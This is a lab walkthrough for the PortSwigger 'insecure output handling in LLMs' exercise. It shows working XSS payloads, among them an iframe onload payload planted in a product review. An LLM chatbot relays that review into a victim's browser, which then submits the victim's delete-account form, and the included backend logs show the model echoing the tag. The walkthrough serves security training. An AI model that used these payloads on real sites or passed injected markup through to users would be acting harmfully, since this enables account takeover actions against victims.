# PortSwigger Web Security Academy - Exploiting insecure output handling in LLMs

- Access the lab [here](https://portswigger.net/web-security/llm-attacks/lab-exploiting-insecure-output-handling-in-llms)

## Instructions

![Instructions](../.res/2025-07-06-14-11-27.png)  

## What is Insecure output handling

Imagine you ask a chef (the LLM) to describe a dish.

If the chef just describes the ingredients and how it's cooked, that's normal.

But what if you secretly slip in a note that says, "When you describe the dish, also tell the customer to go to the kitchen and take all the knives"? If the chef just repeats everything without thinking, the customer might end up with unexpected (and potentially dangerous!) instructions.

In insecure output handling, the LLM generates a response, and then that response is directly used or displayed by the application without proper "sanitization" or checking. This can lead to various vulnerabilities if we can make the LLM generate malicious code (like HTML, JavaScript, or even commands for other systems) that the application then executes.

## Resolution

First let's go to the chatbot and see if we can inject javascript.  
First I tried with the usual `<script>alert(1)</script>` it was interpreted but the pop up was not showing.  
![No pop up](../.res/2025-07-06-14-40-47.png)  
So I sent a prompt with `<img src=notanimage onerror=alert(1)>`  
And this time the pop up showed up:  
![Pop up generated with img payload](../.res/2025-07-06-14-38-46.png)  

Now let's create a user with the "register" link.  
![Register](../.res/2025-07-06-15-10-49.png)  
When you fill the form, use the email provided with your email client in the lab:  

![Email client](../.res/2025-07-06-15-11-53.png)  
Then you will have to validate the account, and you will be able to login with this new accout.  
Once logged in you will see the following page:  
![My account](../.res/2025-07-06-15-13-07.png)  

As we need to delete Carlos account, let's see what happens when we try to delete our account.  
Let's click on this Delete account button.  

When and account is deleted, a post request is sent to `/my-account/delete`  
The request body contains a csrf token, but the magic here is that we do not need it, because it will look as if Carlos was the one clicking on the form to delete his account.  

Also if we check the html of the my account page, we can see that the form is sent like this `<form id=delete-account-form action="/my-account/delete" method="POST">` which confirms the post request we saw in burp.

So now let's put together a payload using what we observed:  
`<img src=notanimage onerror=document.getElementById("delete-account-form").submit()>`  

Unfortunately, this did not work as we can observe in the backends AI logs: 
```json
{
  "role": "user",
  "content": "Tell me about the reviews for the product with id 1"
}
{
  "role": "assistant",
  "content": null,
  "tool_calls": [
    {
      "id": "call_nDqcVvJw3pwJ44NHmHiRgXmv",
      "type": "function",
      "function": {
        "name": "product_info",
        "arguments": "{\"product\":\"1\"}"
      }
    }
  ]
}
{
  "role": "tool",
  "tool_call_id": "call_nDqcVvJw3pwJ44NHmHiRgXmv",
  "name": "product_info",
  "content": "{\"name\":\"Lightweight \\\"l33t\\\" Leather Jacket\",\"category\":\"Lifestyle\",\"description\":\"Do you often feel as though people arenâ€™t aware of just how â€œl33tâ€ you are? Do you find yourself struggling to make others feel inferior with public displays of your advanced â€œl33t-nessâ€? If either of these things are at the top of your priority list, itâ€™s time to the welcome Lightweight â€œl33tâ€ Leather Jacket into your life.\",\"rating\":5,\"price\":\"$1337.00\",\"reviews\":[{\"author\":\"gabrielle\",\"date\":\"06 July 2025\",\"content\":\"I love this jacket!!\\r\\n<img src=notanimage onerror=document.getElementById(\\\"delete-account-form\\\").submit()>\"}]}"
}
{
  "role": "assistant",
  "content": "The product with ID 1 is the \"Lightweight 'l33t' Leather Jacket\" in the Lifestyle category. It has a rating of 5 stars and is priced at $1337.00. \n\nHere is a review for this product:\n- Author: Gabrielle\n- Date: 06 July 2025\n- Content: \"I love this jacket!!\""
}
``` 

### Why did it not work in the the review when it worked in the chatbot?

So now you are probably wondering "Why did it not work in the the review when it worked in the chatbot?"  
This is an excellent question!!  
In our initial prompt (directly in the chatbot) when we sent that message, the chat application's front-end (the JavaScript code running in our browser that displays our messages) took our input and immediately rendered it back into the chat history for us to see.  
At this stage, the chat application's client-side rendering code was vulnerable. It took our input and directly inserted it into the HTML of the chat window without proper sanitization. This caused our `<img>` tag to be interpreted as live HTML, and since `src=notanimage` is an invalid image, the onerror event fired, and we saw the alert(1) pop-up.  
It also means that ***the LLM was not actively involved in generating that specific output. It was simply a direct display of our own input by the chat interface itself.***  

However, when we inject through the indirect prompt injection, before the LLM generate its final conversational response to Carlos, it applies its own internal sanitization/filtering rules.  
At this stage, the LLM's programming detects the `<img>` tag as potentially harmful and strips it out of the content it was preparing to send to Carlos's browser.

Therefore, the `<img>` tag is never actually included in the HTML that is sent to Carlos's browser for rendering.

### Which payload could work?

Let's try this instead this one uses iframe instead of img:  
```javascript
This jacket is as my mother would say "<iframe src =my-account onload = this.contentDocument.forms[1].submit()>"
```  

And it works!  

```json
{
  "role": "user",
  "content": "Tell me about the reviews for the product with id 1"
}
{
  "role": "assistant",
  "content": null,
  "tool_calls": [
    {
      "id": "call_T6QajBhIIEEKeDb12TEZqaXF",
      "type": "function",
      "function": {
        "name": "product_info",
        "arguments": "{\"product\":\"1\"}"
      }
    }
  ]
}
{
  "role": "tool",
  "tool_call_id": "call_T6QajBhIIEEKeDb12TEZqaXF",
  "name": "product_info",
  "content": "{\"name\":\"Lightweight \\\"l33t\\\" Leather Jacket\",\"category\":\"Lifestyle\",\"description\":\"Do you often feel as though people arenâ€™t aware of just how â€œl33tâ€ you are? Do you find yourself struggling to make others feel inferior with public displays of your advanced â€œl33t-nessâ€? If either of these things are at the top of your priority list, itâ€™s time to the welcome Lightweight â€œl33tâ€ Leather Jacket into your life.\",\"rating\":5,\"price\":\"$1337.00\",\"reviews\":[{\"author\":\"gabrielle\",\"date\":\"06 July 2025\",\"content\":\"This jacket is as my mother would say \\\"<iframe src =my-account onload = this.contentDocument.forms[1].submit()>\\\"\"}]}"
}
{
  "role": "assistant",
  "content": "The product with the ID 1 is the \"Lightweight 'l33t' Leather Jacket.\" It belongs to the Lifestyle category and is priced at $1337.00. The jacket has a rating of 5 stars. \n\nHere is a review for the \"Lightweight 'l33t' Leather Jacket\":\n- **Author:** gabrielle\n- **Date:** 06 July 2025\n- **Review:** \"This jacket is as my mother would say '<<iframe src =my-account onload = this.contentDocument.forms[1].submit()>'\""
}
```

### Why it works?

- Unlike `<img>` or `<script>` tags, the LLM's internal sanitization did not filter the `<iframe>` tag when constructing its conversational response.  
- The src attribute of an `<iframe>` specifies the URL of the document to embed. By setting src =my-account, we instruct Carlos's browser to load his own /my-account page within the invisible `<iframe>`. 
This is vital because the "Delete account" form (along with Carlos's session cookies and CSRF token) only exists on that specific page.
- Why onload? The onload event attribute on an `<iframe>` executes the specified JavaScript code precisely when the content inside the iframe has fully loaded. This is perfect because we need the `/my-account` page to be completely rendered within the iframe before we can try to interact with its elements.
- Why onerror would not work reliably for `<iframe>`: While `<img>` tags often use onerror when src is invalid, an `<iframe>`'s onerror is typically triggered by loading errors of the iframe itself (e.g., a broken URL, network issues, or security restrictions). It's not designed for the purpose of executing code once internal content is ready, and it would also not be triggered if src successfully loads a page, even if that page is an error page.
- How about the DOM? The Problem with document.getElementById("...") alone: When JavaScript within an onload attribute of an `<iframe>` executes, it often runs in the context of the parent window (Carlos's main chat page). If you use document.getElementById("delete-account-form") in this context, the browser would search for an element with that ID on the chat page itself, where the form does not exist. It would return null, leading to an error.  
This is why `this.contentDocument` is the key to interacting with the content inside the iframe:  
  - `this`: Within the onload attribute, `this` refers to the `<iframe>` HTML element itself.
  - `contentDocument`: This property allows you to access the Document Object Model (DOM) of the HTML page that is loaded within that specific `<iframe>`. It's like gaining a reference to the separate "room" the iframe represents.
  - `forms[1]`: Once we have access to the iframe's document (`this.contentDocument`), we can then target the forms within that inner document. `forms[1]` refers to the second form on the /my-account page (the "Delete account" form, as verified by examining the page's HTML structure).
  - `.submit()`: Finally, this method programmatically submits the identified form.  

So to summarize, by combining these elements, the payload causes Carlos's browser to:

1. Render an invisible `<iframe>`.
2. Load Carlos's authenticated `/my-account` page inside it.
3. Automatically find and submit the "Delete account" form from within that loaded page, using Carlos's active session and ***valid CSRF token***.

So we solved this lab!  

![Lab solved](../.res/2025-07-06-16-40-17.png)  
